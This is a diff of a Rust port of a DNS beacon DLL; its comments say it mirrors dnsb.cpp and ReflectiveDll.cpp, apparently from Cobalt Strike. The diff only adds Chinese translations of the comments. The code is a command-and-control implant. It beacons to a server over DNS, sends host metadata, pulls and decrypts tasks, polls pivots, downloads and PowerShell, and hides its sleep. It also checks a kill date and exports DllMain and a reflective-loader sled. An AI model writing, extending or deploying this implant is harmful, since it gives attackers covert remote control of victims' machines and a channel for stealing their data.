@@ -1,5 +1,7 @@
+//! DNS Beacon DLL 入口（对应 dnsb.cpp + ReflectiveDll.cpp）。
 //! DNS Beacon DLL entry (mirrors dnsb.cpp + ReflectiveDll.cpp).
 
+//! `adjust`/`length` 循环变量与 `shell_callback` 镜像严格遵循 C++ 入口点。
 //! The `adjust`/`length` loop variables and `shell_callback`
 //! mirrors follow the C++ entry points verbatim.
 #![allow(unused_assignments)]
@@ -30,6 +32,7 @@ use beacon_core::gargle::gargle_sleep;
 
 const DLL_METASPLOIT_ATTACH: u32 = 0x04;
 
+/// 通过 DNS 发送加密并封装好的响应。
 /// Sends an encrypted+packaged response via DNS.
 fn shell_post(buffer: &[u8], length: usize, type_: i32, _send_now: bool) {
     let Some(cipherdata) = command_shell_encrypt(buffer, length, type_) else {
@@ -92,6 +95,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
     let mut max_orig_sleep_time: u32 = 0;
 
     while state::sleep_time() > 0 {
+        // 设置我们回连 beacon 的方式
         // setup how we're going to beacon back
         let mut post_url: Vec<u8> = Vec::new();
         post_url.extend_from_slice(format!("{:x}.", state::agentid()).as_bytes());
@@ -109,20 +113,25 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
         beacon_domain[..n].copy_from_slice(&bd[..n]);
         beacon_domain[n] = 0;
 
+        // 跳过内嵌的 URI
         // skip the embedded URI
         failed_host = false;
         let _ = next_host(&hosts, failed_host, &strategy_info);
 
         if channel_lookup(&beacon_domain, &mut signal) {
+            // 还原……将 signal 与 dnsidle 异或
             // restore... xor signal with dnsidle
             signal = signal.to_be() ^ dnsidle;
 
             if signal == 0x0 {
+                // 什么都不做
                 // do nothing
             } else if (signal & 0xFFFF_FFF0) == 0xF0 {
+                // 根据通道类型设置最大 DNS 长度
                 // set our max dns length based on the channel type
                 set_max_dns(signal);
 
+                // 信号是否表明需要发送元数据？
                 // did the signal indicate that we need to send metadata?
                 if (signal & 0x01) == 0x01 {
                     let bs = state::BIGSESSION.lock();
@@ -132,6 +141,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
                     dns_put(&dnsbeacon_putmetadata, &post_url, &data, len);
                 }
 
+                // 请通过 DNS 获取任务
                 // get tasks over DNS plz
                 let buffer_len = buffer.len();
                 let mut length: i32 = 0;
@@ -143,6 +153,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
                     length = dns_get(&post_url, &mut buffer, buffer_len) as i32;
                 }
 
+                // 在处理 payload 之前先解密并校验
                 // decrypt and verify the payload before processing it
                 if length > 0 {
                     length = security_decrypt(&mut buffer, length as usize);
@@ -152,16 +163,19 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
                 }
             }
 
+            // 检查我们的 pivots、下载、links、powershell
             // check our pivots, downloads, links, powershell
             pivot_poll(shell_callback);
             download_poll(shell_callback, beacon_core::commands::MAX_PACKET_DNS);
             link_poll(shell_callback);
             psh_poll(shell_callback, beacon_core::commands::MAX_PACKET);
         } else {
+            // 切换到新的主机
             // move on to a new host
             failed_host = true;
         }
 
+        // 检查终止日期
         // check the kill date
         if check_kill_date() {
             command_die(shell_callback);
@@ -171,6 +185,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
             return;
         }
 
+        // 检查最大重试策略
         // check max retry strategy
         let mut sleep_time = state::sleep_time();
         if check_max_retry(failed_host, &mut max_retry_count, &mut sleep_time, &mut max_orig_sleep_time) {
@@ -179,6 +194,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
         }
         state::set_sleep_time(sleep_time);
 
+        // 想睡多久就睡多久
         // sleep for as long as we need to
         let sleep_time = state::sleep_time();
         if sleep_time > 0 {
@@ -200,6 +216,7 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
     safe_exit();
 }
 
+/// DllMain（ReflectiveDll.cpp）。
 /// DllMain (ReflectiveDll.cpp).
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
@@ -241,6 +258,7 @@ pub unsafe extern "system" fn DllMain(
     return 1;
 }
 
+/// ReflectiveLoader sled（相当于 ReflectiveLoader.5k，共 5120 字节）。
 /// ReflectiveLoader sled (ReflectiveLoader.5k equivalent, 5120 bytes).
 #[no_mangle]
 pub static ReflectiveLoader: [u8; 5120] = build_sled();
